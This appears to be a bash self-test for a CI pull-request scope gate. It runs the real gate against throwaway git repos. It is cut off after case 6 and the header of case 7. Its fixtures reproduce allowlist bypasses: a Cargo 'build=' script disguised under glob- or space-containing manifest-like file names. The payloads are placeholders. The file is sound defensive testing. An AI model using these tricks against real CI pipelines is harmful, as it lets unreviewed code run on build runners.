#!/usr/bin/env bash
# SPDX-License-Identifier: MIT OR Apache-2.0
#
# Self-test for scripts/pr-scope-check.sh.
#
# WHY THIS EXISTS. pr-scope-check.sh is the only one of the three self-tested
# shell gates that adjudicates author identity and an allowlist, and until
# now it had no self-test at all: PR 837's own body substituted a nine-row
# markdown table of asserted regex results for a test. That table was true of
# the regex and false of the script, because every row was computed by
# matching a path against a pattern by hand, never by running the actual
# shell loop that decides. The loop, not the regex, is what a max-effort
# adversarial review found broken: `for f in $changed_now`, unquoted, hands
# bash a string it word-splits AND glob-expands, so a diff entry containing a
# glob metacharacter or a space is never the path actually tested. Proven
# against the real script and real cargo: a bot PR reported EXEMPT while
# `cargo build` compiled and ran a payload smuggled past it.
#
# This runs the REAL script, not a description of it, against throwaway git
# repositories with a stubbed `gh`, so it exercises the loop the way CI
# actually does, the same discipline invariant-lints-selftest.sh and
# test-census-selftest.sh already apply to their own scripts.
#
# ===========================================================================
# COVERAGE LIMIT (round eleven). Read this before adding a case or trusting
# a "clean" run. It replaces any earlier impression that this suite sweeps
# every mutation of scripts/pr-scope-check.sh: it does not, and after round
# eleven it stops trying to.
#
# WHAT IS PINNED BY CONSTRUCTION. Each of these is a specific, checkable
# claim, not a round-count boast:
#
#   - THE NINE KNOWN EXPLOIT VECTORS this PR series exists to close: V1 glob
#     (case 1), V2 whitespace (case 2), V3 build=Cargo.lock (case 13), V3's
#     [[bin]] path variant (case 14), V3's build= pointed at the still-
#     allowlisted crates/<n>/fuzz/Cargo.lock (case 15), V3C rename-hides-
#     deletion (case 17), V4 [[example]] test=true (case 23), door 2 (case
#     24) and door 3 (case 25).
#   - EVERY EXIT SITE ASSERTS ITS OWN EXIT CODE, not merely its printed
#     text. All 11 `exit 1` refusal sites in scripts/pr-scope-check.sh
#     (lines 86, 90, 94, 149, 234, 258, 660, 681, 691, 751, 852) were each
#     flipped to `exit 0` in turn and shown to turn this suite red (round
#     six); `run_scope` has captured the real exit code, never discarded
#     it, since.
#   - ALL 14 ELEMENT-EXPANSION SITES over `changed`/`declared`: the 13
#     `for x in "${arr[@]}"` loops at lines 251, 632, 640, 653, 764, 768,
#     785, 790, 802, 817, 824, 876, 879, plus the DECLARED array's own
#     population (lines 758-761), each shown to reopen a real bypass when
#     unquoted, one at a time (round seven; cases 1, 2, 10, 19, 20, 48-54
#     collectively close all 13, plus case 49 for the population site).
#   - BOTH ALLOWLISTS' GLOBAL ANCHORS AND THEIR PER-ALTERNATIVE COMPONENT
#     TOKENS: all four global anchor drops (BOT_ALLOWED's own `^` and `$`,
#     ALWAYS_ALLOWED's own `^` and `$`) die, 4 of 4. Every one of
#     BOT_ALLOWED's eight alternatives (cases 70-88, 94-99) and
#     ALWAYS_ALLOWED's one (cases 69, 100) has its directory and filename
#     literals and its dot-escape pinned by a fixture that shares every
#     OTHER token with a real allowlisted path and differs in only the one
#     token being tested: 18 of 18 component widens and 11 of 11 dot-escape
#     strips die.
#
#     NOT the PER-ALTERNATIVE anchors, and an earlier version of this bullet
#     said otherwise. Relaxing one alternative's own leading or trailing
#     anchor (`Ai` to `.*Ai` or to `Ai.*`, leaving the global anchors alone)
#     is 18 mutants, of which 6 die and 12 SURVIVE with the suite printing
#     clean; five of the twelve were shown to be real EXEMPT bypasses rather
#     than equivalent mutants. The six that die are ALWAYS_ALLOWED's two
#     (its single alternative makes those the global anchors) plus a1-lead,
#     a1-trail, a2-lead and a3-trail. This is an instance of the general
#     limit below, not a separate gap to chase.
#   - BOTH GREP CALL-SITE FLAGS: the two `grep -qE "$VAR"` call sites gating
#     BOT_ALLOWED and ALWAYS_ALLOWED are each pinned against silently
#     becoming case-insensitive (cases 101, 102).
#   - BOTH DIRECTORY-DECLARATION ARMS (the `ok` arm at line 826 and its
#     `cargo_lock_exempt` sibling at line 792): each is pinned against a
#     total collapse (cases 103, 104) AND against relaxing its PREFIX test
#     to a SUBSTRING test (cases 106, 107).
#   - THE VACUITY GUARD (the `_finish` EXIT trap plus `CASES_FLOOR`, below)
#     and the NOTE_COUNT/`NOTE_FLOOR` guard below it: both are measured
#     directly against this exact committed file, not asserted -- see the
#     line-by-line boundary search in the comment above `CASES_FLOOR` and
#     the watched-to-fire note above `NOTE_FLOOR`.
#
# WHAT IS NOT, AND WHY NO FUTURE ROUND SHOULD TRY TO MAKE IT SO. This suite
# does NOT claim that every one-token relaxation of BOT_ALLOWED or
# ALWAYS_ALLOWED dies. Round ten mechanically enumerated four relaxation
# operators (escape-strip, whole-component-widen, suffix-widen, anchor-
# drop); round eleven's own independent review enumerated nine (those four
# plus single-char-widen, char-optional, quantifier-widen, class-widen and
# insert-optional), found 644 one-token relaxations of the two allowlists
# and the two grep call sites, and 524 of them survived -- almost entirely
# ones outside whichever operator list a round had actually swept. The one-
# token relaxation space of a regex is not enumerable by construction the
# way a fixed list of exploit vectors or loop sites is: a twelfth round
# could define a tenth or fifteenth operator and enumerate a larger space
# again. Chasing that space to zero survivors is therefore not a reachable
# goal, and this suite stops treating it as one after round eleven's review
# reproduced round nine's own "pinned the list, not the space" defect one
# level up, on OPERATORS instead of mutants (see the ROUND ELEVEN comment
# ahead of case 105 for the specific, semantic gaps that round closed
# instead of chasing a tenth operator).
#
# WHAT TO DO INSTEAD. When BOT_ALLOWED, ALWAYS_ALLOWED, or either directory-
# declaration arm changes, add a case for the SPECIFIC PROPERTY the change
# is about -- the new alternative's own anchors and component tokens, or the
# new arm's own prefix-vs-substring boundary -- the same way cases 70-108 do
# for every alternative and arm that already exists. Do not launch another
# operator sweep expecting to reach zero survivors: the two rounds that
# tried each found a larger space than the round before it, and there is no
# reason to expect a third attempt would end differently.
# ===========================================================================

# Vacuity guard (round seven, hardened round eight, RE-HARDENED round ten,
# BLOCKING). Nothing previously counted how much of this file actually RAN:
# an `exit 0` inserted before case 1, or most of the cases below simply
# deleted, both left this file printing "clean" with rc=0, because `FAILED`
# only ever records a case that ran and found something wrong, never the
# absence of cases to run in the first place.
#
# A plain shell variable cannot do the counting: almost every case invokes
# `run_scope` as `OUT="$(run_scope ...)"`, and `$( )` command substitution
# ALWAYS forks a subshell, so any `CASES=$((CASES+1))` executed from inside
# `run_scope` would increment a copy that vanishes the instant the
# substitution completes, leaving the parent shell's `$CASES` at 0
# regardless of how many cases actually ran (caught directly: the first
# version of this guard did exactly that and reported "3 case(s) ran", the
# three case-47 guards below, which are the only call sites that do not go
# through `run_scope`'s `$( )`, the rest silently lost). A byte appended to a
# FILE survives a subshell exiting the same way any other filesystem write
# does, so `run_scope` appends one byte to `$CASES_FILE` per call (see
# there), case 47's three direct guards do the same, and the byte count of
# that file, read back after every case has run, is the case count.
#
# ROUND SEVEN'S OWN VERSION of this guard only checked the count AFTER
# reaching the bottom of the script, so it caught a case deleted wholesale
# (case 46b removed: 75 ran, floor 76, guard fires) but not an `exit 0`
# inserted before case 1, which leaves 0 bytes in `$CASES_FILE` and rc=0,
# and terminates the script before that bottom-of-file check is ever
# reached at all: a refusal-shaped file that never actually refuses
# anything, exactly the branch-protection-reports-SUCCESS failure mode this
# whole suite exists to catch, reached one layer up, in the judge of the
# judge. Round seven's own comment asserted this "structurally cannot be
# caught by anything placed later in this same linear script" and drew the
# right conclusion (move the CHECK earlier, not the exit later): an EXIT
# trap fires on every exit this script takes, not only the ones that fall
# through to the bottom.
#
# ROUND EIGHT installed that trap a few statements into the script, after
# `set -euo pipefail`, `cd`, and `WORK="$(mktemp -d)"`, and asserted it
# therefore covered "an `exit 0` reached on line 2". ROUND TEN'S OWN REVIEW
# measured that claim directly rather than trusting it, by binary-searching
# with a real `exit 0` inserted at successive lines of the committed file:
# every insertion point from the shebang down through the trap's own
# `_finish`/`trap` statements produced a SILENT rc=0 vacuous pass, and only
# an `exit 0` placed AFTER the trap installation was caught. The prose was
# correct about WHY an EXIT trap works and wrong about WHERE this one
# reached: "installed once, here" was not early enough, because "here" was
# still several statements past the top of the file. A trap that is not
# installed YET cannot fire, no matter how early "installed once" sounds.
#
# The fix is to make the trap installation as close to the literal first
# thing this script's interpreter executes as a trap CAN be: ahead of
# `set -euo pipefail` and `cd` and `WORK`, not merely early relative to the
# case bodies. `CASES_FILE` and `WORK` are given safe empty defaults so
# `_finish` degrades to "0 cases ran" rather than an unbound-variable error
# if it fires before either is assigned for real a few lines below. The only
# statements left ahead of the `trap` command itself are the four trivial,
# infallible variable assignments immediately below (`CASES_FLOOR`, `DONE`,
# `CASES_FILE`, `WORK`) and the `_finish` function DEFINITION (registering
# the function does not run its body), none of which can itself abort or
# exit; the trap command has to be a real, separate statement, so it cannot
# also be the first character of the file. This is a claim about WHERE the
# residual gap is, not an assertion that there is none, and it is measured
# below, not merely asserted.
CASES_FLOOR=115
DONE=0
CASES_FILE=""
WORK=""
_finish() {
  local rc=$? n=0
  if [ -n "$CASES_FILE" ] && [ -f "$CASES_FILE" ]; then
    n="$(wc -c < "$CASES_FILE" 2>/dev/null | tr -d ' ')"
    [ -n "$n" ] || n=0
  fi
  [ -n "$WORK" ] && rm -rf "$WORK"
  if [ "$DONE" -ne 1 ] || [ "$n" -lt "$CASES_FLOOR" ]; then
    echo "pr-scope-check-selftest: FAILED. exited early or with too few cases ($n case(s) ran," >&2
    echo "DONE=$DONE, expected at least $CASES_FLOOR and DONE=1). A self-test that runs" >&2
    echo "(almost) nothing, exits before reaching its own verdict, or silently drops one of its" >&2
    echo "own cases, must not report success for having found nothing." >&2
    exit 1
  fi
  exit "$rc"
}
trap _finish EXIT
#
# WATCHED TO FIRE, both ways, directly against this file (not merely
# reasoned about; round eight's own experiments (a)/(b)/(c)/(c2)/(d), and
# round ten's own line-by-line boundary search, both reproduced here, INCLUDING
# the false positive the first version of this search produced: an `exit 0`
# spliced in immediately before the `_finish` function's closing `}` lands
# INSIDE that function's body, after its own `exit` statements, so it is
# genuinely dead code and proves nothing about the trap either way). With
# that corrected, the measured boundary is: an `exit 0` inserted anywhere
# from the shebang through the `trap _finish EXIT` statement's OWN line
# (the four assignments above, the `_finish` definition, or in place of the
# `trap` line itself) is still a silent, uncaught rc=0 vacuous pass, exactly
# as round eight's version of this file was for a much larger span (its
# trap sat several real statements later, at what was then line 104); an
# `exit 0` inserted anywhere AFTER that line -- including immediately after
# it -- is caught, rc=1, "0 case(s) ran ... DONE=0". A trap cannot fire
# before the statement that installs it has run; that is the one part of
# the old blind spot no reordering can remove, and it is now the ONLY part
# left. An `exit 0` inserted before case 1 -> rc=1, "0 case(s) ran ...
# DONE=0"; deleting every case from case 2 through the end -> rc=1, "1
# case(s) ran"; deleting case 46b entirely -> rc=1, "... case(s) ran" one
# short of the floor; an unmutated run -> rc=0, "pr-scope-check-selftest:
# clean". The trap's own `exit` statements are
# explicit, not an implicit fatal-expansion abort, so they propagate their
# status correctly regardless of where in the script the trap fired from
# (the same distinction pr-scope-check.sh's own header comment makes about
# `${VAR:?}` versus an explicit `exit`); and on the CLEAN path the trap
# re-emits the script's own already-decided exit status (`exit "$rc"`,
# captured from `$?` as the trap's very first statement) rather than
# substituting its own, so it does not itself turn a legitimate `exit 1` (a
# real case failure, `$FAILED` non-zero) into a different, misleadingly
# "vacuous" message: `DONE` is set to 1 on that path too, before the
# script's own explicit `exit 1`, so the trap recognises it as a genuine,
# already-explained failure and simply relays the status.
set -euo pipefail
cd "$(git rev-parse --show-toplevel)"
WORK="$(mktemp -d)"
CASES_FILE="$WORK/.cases-ran"
: > "$CASES_FILE"
FAKEBIN="$WORK/fakebin"
# Captured before any case puts a stub `git` on FAKEBIN (round four, case 35
# below), so that stub has a real git to delegate everything except the one
# call it is deliberately narrowing.
REAL_GIT="$(command -v git)"

# Exercise the PROPOSED script, not whatever happens to be sitting on disk at
# scripts/pr-scope-check.sh (PR 837's third review round). The `invariants`
# job's earlier "Restore every gate script from the BASE branch" step
# overwrites the ON-DISK copy of scripts/pr-scope-check.sh with BASE's
# version, THE JUDGE MAY NOT BE EDITED BY THE DEFENDANT, exactly the same
# protection pr-scope-check.sh itself gets in the separate `scope` job. But
# this selftest is new on this PR (it does not exist on base yet), so it is
# NOT restored: it runs from HEAD while the file it tests has just been
# reverted to BASE underneath it. Reading the on-disk file would therefore
# make head's test judge base's (pre-hardening) script, never the change
# this PR is actually proposing: reproduced verbatim by the reviewer, exit 1
# with 4 failing cases, on this very PR.
#
# `git show HEAD:scripts/pr-scope-check.sh` reads the committed blob at the
# current commit instead, which the restore step's `git checkout FETCH_HEAD
# -- scripts/pr-scope-check.sh` does not move (that command only touches the
# working tree and the index for that one path, never HEAD itself), so it
# always resolves to the PROPOSED script regardless of what the restore step
# left on disk.
#
# On a LATER PR, once this selftest itself exists on the base branch, THIS
# file is what the restore step puts back (unmodified, trusted), and it is
# what runs; it still resolves SCOPE via `git show HEAD:...`, so a trusted
# test judges the proposed judge, which is the property this exists for. A
# PR that tries to weaken both the script and this selftest in the same
# commit gains nothing: the invariants job runs base's copy of this file,
# not head's.
SCOPE="$WORK/pr-scope-check-under-test.sh"
git show HEAD:scripts/pr-scope-check.sh > "$SCOPE"
chmod +x "$SCOPE"

FAILED=0
note() { printf '  %s\n' "$1"; }

# Assertion-density companion guard (round eight, SHOULD_FIX). The vacuity
# guard above (CASES_FLOOR, via the EXIT trap) counts `run_scope`
# INVOCATIONS. That closes a case deleted WHOLESALE, call site and all
# (round six's case 46b regression, and the round-seven guard's own proof:
# deleting case 46b drops the byte count below the floor). It does NOT close
# the adjacent shape: leave the `run_scope` call in place and delete only
# the assertions it feeds. The byte is still appended, the floor still
# reads at or above CASES_FLOOR, and the suite would still print "clean"
# with that case now asserting nothing.
#
# Every case in this file that expects a specific outcome prints `note
# "..."` on the arm where that outcome actually held; no case has zero
# `note` calls and no assertion body is deleted without deleting the `note`
# call inside it. Counting SOURCE OCCURRENCES of that call in the COMMITTED
# file (`git show HEAD:`, the identical trust boundary `$SCOPE` itself
# already uses a few lines below, not whatever happens to be sitting on
# disk) closes it: gutting a case's assertion body necessarily removes the
# `note` line printed by its success arm, so this count drops even though
# the runtime call-count guard has nothing to observe (the call site itself
# was never touched).
#
# This is a STATIC floor, not a runtime one; there is nothing left to
# observe at runtime once the source line is gone. Like CASES_FLOOR it is
# deliberately EXACT, not comfortably low, for the identical reason: a loose
# floor set safely below the true total would not have caught the
# regression this exists to catch, either. The next round that legitimately
# adds, removes, or restructures a case MUST update this number in the same
# commit.
#
# WATCHED TO FIRE, directly against this file: deleting case 46b's entire
# `if [ "$RC46b" -eq 0 ]; then ... fi` assertion block, INCLUDING its final
# `else / note "..." / fi`, while leaving the `run_scope` call above it
# completely untouched, drops NOTE_COUNT by exactly one (case 46b's own
# single `note` call) and this guard fires; CASES_FLOOR above does not, for
# the reason this guard exists.
NOTE_COUNT="$(git show HEAD:scripts/pr-scope-check-selftest.sh | grep -c '^[[:space:]]*note "' || true)"
NOTE_FLOOR=142
if [ "$NOTE_COUNT" -lt "$NOTE_FLOOR" ]; then
  echo "pr-scope-check-selftest: FAILED. Only $NOTE_COUNT note() call site(s) found in the" >&2
  echo "committed file (expected at least $NOTE_FLOOR). A case whose run_scope call survives" >&2
  echo "but whose own assertion body (and the note() call inside it) was stripped out is" >&2
  echo "invisible to the invocation-count guard above; this one counts source, not execution." >&2
  exit 1
fi

# new_repo <dir> -- an empty throwaway git repo, ready for a base commit.
new_repo() {
  local dir="$1"
  rm -rf "$dir"; mkdir -p "$dir"
  git -C "$dir" init -q -b main
  git -C "$dir" config user.email t@t
  git -C "$dir" config user.name t
}

commit_all() {  # commit_all <dir> <message>
  local dir="$1" msg="$2"
  ( cd "$dir" && git add -A >/dev/null && git commit -qm "$msg" >/dev/null )
}

# fake_gh <author> <pr_body> [issue_body] -- (re)writes the stub `gh` on
# FAKEBIN. Pre-renders the JSON with jq in THIS script's own shell, so the
# generated stub never has to re-escape a PR or issue body itself; it just
# cats a file. The real script needs jq too, so this adds no new dependency.
#
# The two `gh api` call sites in the real script are NOT symmetric: the PR
# lookup has no `--jq` flag, so the real `gh` returns the whole JSON envelope
# and the script's own `jq -r` pulls `.body` and `.user.login` back out of
# it; the issue lookup DOES pass `--jq '.body // ""'`, so the real `gh`
# applies that filter itself and returns the already-extracted body text,
# not an envelope. The stub has to match each call's actual contract, not
# just "return some JSON", or it silently feeds the script a JSON-quoted
# blob where it expects plain markdown, which never matches "## Files" and
# fails every non-bot case for a reason that has nothing to do with the
# script being tested.
fake_gh() {
  local author="$1" pr_body="$2" issue_body="${3:-}"
  mkdir -p "$FAKEBIN"
  jq -n --arg body "$pr_body" --arg login "$author" \
    '{body: $body, user: {login: $login}}' > "$FAKEBIN/pr.json"
  printf '%s' "$issue_body" > "$FAKEBIN/issue-body.txt"
  cat > "$FAKEBIN/gh" <<FAKEGH
#!/usr/bin/env bash
case "\$*" in
  *"repo view"*) echo "test-org/test-repo" ;;
  *"pulls/"*) cat "$FAKEBIN/pr.json" ;;
  *"issues/"*) cat "$FAKEBIN/issue-body.txt" ;;
  *) echo "fake gh: unhandled args: \$*" >&2; exit 1 ;;
esac
FAKEGH
  chmod +x "$FAKEBIN/gh"
}

# run_scope <dir> [base_sha] [head_sha] -- runs the real script against
# <dir>, whose fake_gh was already configured. Defaults BASE_SHA/HEAD_SHA to
# main/HEAD; a case that needs a specific pair (an unrelated commit, an
# orphan branch) passes them explicitly.
#
# ROUND SIX CORRECTION. This used to end in `bash "$SCOPE" 2>&1 || true`,
# which threw away the real script's exit code and left every case in this
# file reading only the OUTPUT TEXT, the same convention test-census-selftest.sh
# uses. That convention is safe for test-census.sh, which never prints a
# refusal-shaped message on a path that also exits 0. It is NOT safe here,
# because this script's own header says so in as many words: "GitHub reports
# a skipped job to branch protection as SUCCESS", and a check whose FAIL text
# still prints while its exit code is 0 is exactly that failure mode reached
# one layer up, in the judge rather than the defendant. Proven directly:
# flipping any of eight of this script's eleven `exit 1` refusals to `exit 0`
# left every case in this file, before this fix, fully green, including the
# case covering the bot-path refusal this whole PR series exists to harden.
#
# `|| true` is gone. The function's own exit status is now whatever
# `bash "$SCOPE"` returned, and every call site below captures it with the
# `OUT="$(run_scope ...)" && RC=0 || RC=$?` idiom (verified directly: under
# `set -e`, this form propagates a subshell's real exit status into `RC`
# without the failing status itself tripping this self-test's own `set -e`,
# the same shape case 47 already uses for the three required-variable
# guards, generalised to every case rather than three of them). A case
# expecting a refusal now asserts `RC` is non-zero; a case expecting EXEMPT
# or an ordinary match asserts `RC` is zero. Text is still checked too, so a
# refusal for the WRONG reason (right rc, wrong message) still fails.
run_scope() {
  local dir="$1" base="${2:-}" head="${3:-}"
  # Vacuity guard bookkeeping (round seven). A FILE append, not a variable
  # increment: nearly every call site is `OUT="$(run_scope ...)"`, and `$( )`
  # runs this whole function in a subshell, so a `CASES=$((CASES+1))` here
  # would increment a copy the parent shell never sees (verified directly:
  # that was tried first, and reported "3 case(s) ran" for the three case-47
  # guards that do not go through `$( )`, silently losing the other 73). A
  # write to `$CASES_FILE` survives the subshell exiting the same way any
  # other filesystem change would. See the final assertion at the bottom of
  # this file for what this guards against.
  printf '.' >> "$CASES_FILE"
  ( cd "$dir"
    [ -z "$base" ] && base="$(git rev-parse main)"
    [ -z "$head" ] && head="$(git rev-parse HEAD)"
    PATH="$FAKEBIN:$PATH" GITHUB_REPOSITORY=test-org/test-repo PR_NUMBER=1 \
      BASE_SHA="$base" HEAD_SHA="$head" bash "$SCOPE" 2>&1
  )
}

# ---------------------------------------------------------------------------
# 1. Exploit vector 1 (glob). A payload named so its own diff entry is a glob
#    pattern that expands to an allowlisted sibling must be REFUSED, and the
#    refusal must name the REAL payload path, not the path it glob-expands
#    to. This is the direct reproduction of PR 837's finding: EXEMPT, then
#    cargo compiles and runs the payload during `cargo build`.
# ---------------------------------------------------------------------------
D1="$WORK/vector1-glob"
new_repo "$D1"
mkdir -p "$D1/crates/pol/src"
printf '[workspace]\nmembers=["crates/pol"]\n' > "$D1/Cargo.toml"
printf 'pub fn x(){}\n' > "$D1/crates/pol/src/lib.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\n' > "$D1/crates/pol/Cargo.toml"
commit_all "$D1" base
git -C "$D1" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\nbuild="Cargo.tom[l]"\n' > "$D1/crates/pol/Cargo.toml"
printf 'fn main(){ /* arbitrary code on the CI runner */ }\n' > "$D1/crates/pol/Cargo.tom[l]"
commit_all "$D1" attack
fake_gh 'dependabot[bot]' ''
echo "== exploit vector 1: glob-expandable payload name must be refused, by its real name =="
OUT1="$(run_scope "$D1")" && RC1=0 || RC1=$?
if [ "$RC1" -eq 0 ]; then
  echo "FAIL: case 1 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT1" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT1" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: the glob-expandable payload was reported EXEMPT. Got:"
  echo "$OUT1" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT1" | grep -qF 'crates/pol/Cargo.tom[l]'; then
  echo "FAIL: the payload was refused, but not named by its real path. Got:"
  echo "$OUT1" | sed 's/^/    /'
  FAILED=1
else
  note "refused, and the real payload path is named"
fi

# ---------------------------------------------------------------------------
# 2. Exploit vector 2 (whitespace). A payload path containing a space splits
#    into two allowlisted fragments under word-splitting alone, no existing
#    file required. Must be refused and named by its real (space-containing)
#    path.
# ---------------------------------------------------------------------------
D2="$WORK/vector2-space"
new_repo "$D2"
mkdir -p "$D2/crates/pol/src"
printf '[workspace]\nmembers=["crates/pol"]\n' > "$D2/Cargo.toml"
printf 'pub fn x(){}\n' > "$D2/crates/pol/src/lib.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\n' > "$D2/crates/pol/Cargo.toml"
commit_all "$D2" base
git -C "$D2" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\nbuild="Cargo.toml Cargo.toml"\n' > "$D2/crates/pol/Cargo.toml"
printf 'fn main(){ /* arbitrary code */ }\n' > "$D2/crates/pol/Cargo.toml Cargo.toml"
commit_all "$D2" attack
fake_gh 'dependabot[bot]' ''
echo "== exploit vector 2: space-splitting payload name must be refused, by its real name =="
OUT2="$(run_scope "$D2")" && RC2=0 || RC2=$?
if [ "$RC2" -eq 0 ]; then
  echo "FAIL: case 2 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT2" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT2" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: the space-splitting payload was reported EXEMPT. Got:"
  echo "$OUT2" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT2" | grep -qF 'crates/pol/Cargo.toml Cargo.toml'; then
  echo "FAIL: the payload was refused, but not named by its real (space-containing) path. Got:"
  echo "$OUT2" | sed 's/^/    /'
  FAILED=1
else
  note "refused, and the real space-containing payload path is named"
fi

# ---------------------------------------------------------------------------
# 3. A bot PR touching crates/<name>/src/ must still be refused. This is
#    issue #836's own acceptance criterion 2, the property that must not
#    regress while the allowlist is widened.
# ---------------------------------------------------------------------------
D3="$WORK/bot-touches-src"
new_repo "$D3"
mkdir -p "$D3/crates/pol/src"
printf '[workspace]\nmembers=["crates/pol"]\n' > "$D3/Cargo.toml"
printf 'pub fn x(){}\n' > "$D3/crates/pol/src/lib.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D3/crates/pol/Cargo.toml"
commit_all "$D3" base
git -C "$D3" checkout -qb pr
printf 'pub fn x(){ 1 }\n' > "$D3/crates/pol/src/lib.rs"
commit_all "$D3" attack
fake_gh 'dependabot[bot]' ''
echo "== a bot PR touching crates/<name>/src/ must be refused =="
OUT3="$(run_scope "$D3")" && RC3=0 || RC3=$?
if [ "$RC3" -eq 0 ]; then
  echo "FAIL: case 3 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT3" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT3" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a bot PR touching source was reported EXEMPT. Got:"
  echo "$OUT3" | sed 's/^/    /'
  FAILED=1
else
  note "a bot PR touching crates/<name>/src/ is refused"
fi

# ---------------------------------------------------------------------------
# 4. A nested crate manifest, crates/a/b/Cargo.toml, must be refused: the
#    [^/]+ segment in BOT_ALLOWED is deliberately exactly one path component.
#
#    ROUND SEVEN CORRECTION. The fixture used to bump `package.version`,
#    which the manifest CAPABILITY engine refuses on its own (`package.*` is
#    never allowed to change, path or no path), so the case's "not EXEMPT"
#    assertion was true for a reason that had nothing to do with the path
#    anchor it claims to pin: widening `[^/]+` to `.+` left the whole suite
#    green (mutant E04, PR 837 round seven review). The fixture now moves
#    ONLY a dependency version string, the one change the capability engine
#    never refuses on its own, so the path anchor is the ONLY thing that can
#    still refuse it.
# ---------------------------------------------------------------------------
D4="$WORK/nested-crate"
new_repo "$D4"
mkdir -p "$D4/crates/a/b"
printf '[workspace]\nmembers=["crates/a/b"]\n' > "$D4/Cargo.toml"
printf '[package]\nname="b"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D4/crates/a/b/Cargo.toml"
commit_all "$D4" base
git -C "$D4" checkout -qb pr
printf '[package]\nname="b"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.1"\n' > "$D4/crates/a/b/Cargo.toml"
commit_all "$D4" "chore(deps): bump serde"
fake_gh 'dependabot[bot]' ''
echo "== crates/a/b/Cargo.toml (nested, PURE dependency-version bump) must still be refused by the path anchor alone =="
OUT4="$(run_scope "$D4")" && RC4=0 || RC4=$?
if [ "$RC4" -eq 0 ]; then
  echo "FAIL: case 4 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT4" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT4" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a nested crate manifest's pure dependency-version bump was reported EXEMPT. Got:"
  echo "$OUT4" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT4" | grep -qF 'outside the dependency allowlist'; then
  echo "FAIL: refused, but not for being outside the path allowlist (the capability engine may have refused it" >&2
  echo "instead, which would not actually pin the [^/]+ anchor this case exists to test). Got:" >&2
  echo "$OUT4" | sed 's/^/    /'
  FAILED=1
else
  note "crates/a/b/Cargo.toml (a pure, otherwise-legal dependency bump) is refused by the path anchor alone"
fi

# ---------------------------------------------------------------------------
# 5. Cargo.toml.bak must be refused: BOT_ALLOWED is anchored with $, so a
#    trailing suffix after the real manifest name does not match.
# ---------------------------------------------------------------------------
D5="$WORK/cargo-toml-bak"
new_repo "$D5"
printf '[workspace]\nmembers=[]\n' > "$D5/Cargo.toml"
commit_all "$D5" base
git -C "$D5" checkout -qb pr
printf 'stale copy\n' > "$D5/Cargo.toml.bak"
commit_all "$D5" attack
fake_gh 'dependabot[bot]' ''
echo "== Cargo.toml.bak must be refused =="
OUT5="$(run_scope "$D5")" && RC5=0 || RC5=$?
if [ "$RC5" -eq 0 ]; then
  echo "FAIL: case 5 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT5" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT5" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: Cargo.toml.bak was reported EXEMPT. Got:"
  echo "$OUT5" | sed 's/^/    /'
  FAILED=1
else
  note "Cargo.toml.bak is refused"
fi

# ---------------------------------------------------------------------------
# 6. The motivation, issue #836 itself: a legitimate per-crate dependency
#    bump, touching only ONE crate's Cargo.toml (not the root), must be
#    EXEMPT. This is the direct regression test for the widening this PR
#    exists to ship; it must keep passing after the loop is hardened.
# ---------------------------------------------------------------------------
D6="$WORK/legit-per-crate-bump"
new_repo "$D6"
mkdir -p "$D6/crates/irontraffic-policy"
printf '[workspace]\nmembers=["crates/irontraffic-policy"]\n' > "$D6/Cargo.toml"
printf '[package]\nname="irontraffic-policy"\nversion="0.1.0"\n\n[dependencies]\nlogos="0.13"\n' > "$D6/crates/irontraffic-policy/Cargo.toml"
commit_all "$D6" base
git -C "$D6" checkout -qb pr
printf '[package]\nname="irontraffic-policy"\nversion="0.1.0"\n\n[dependencies]\nlogos="0.14"\n' > "$D6/crates/irontraffic-policy/Cargo.toml"
commit_all "$D6" bump
fake_gh 'dependabot[bot]' ''
echo "== a legitimate per-crate manifest bump must be EXEMPT (issue #836's own motivation) =="
OUT6="$(run_scope "$D6")" && RC6=0 || RC6=$?
if [ "$RC6" -ne 0 ]; then
  echo "FAIL: case 6 was expected to pass (rc=0) but exited non-zero (rc=$RC6)." >&2
  echo "$OUT6" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT6" | grep -qF 'pr-scope-check: EXEMPT'; then
  note "the per-crate bump is EXEMPT"
else
  echo "FAIL: a legitimate per-crate manifest bump was refused. Got:"
  echo "$OUT6" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 7. A non-bot author must still be required to close an issue, even when
#    the diff only touches manifests.
# ---------------------------------------------------------------------------
